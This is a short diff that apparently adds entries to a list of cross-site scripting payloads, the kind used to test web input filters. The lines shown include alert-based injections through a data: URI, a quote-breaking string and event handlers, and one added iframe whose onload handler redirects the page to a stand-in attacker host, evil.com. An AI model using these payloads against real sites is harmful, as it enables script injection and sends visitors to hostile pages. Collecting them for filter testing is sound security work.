@@ -13,3 +13,6 @@ data:text/javascript,alert(1);
 1');alert(1);//
 
 <img src=x onerror=alert("position"); //>
+
+<iframe src=“https://bing.com” onload=document.location=“https://evil.com” onmouseover=“alert(‘mouse’)”></iframe>
+<a onmouseover=alert("ttt");>xss</a>
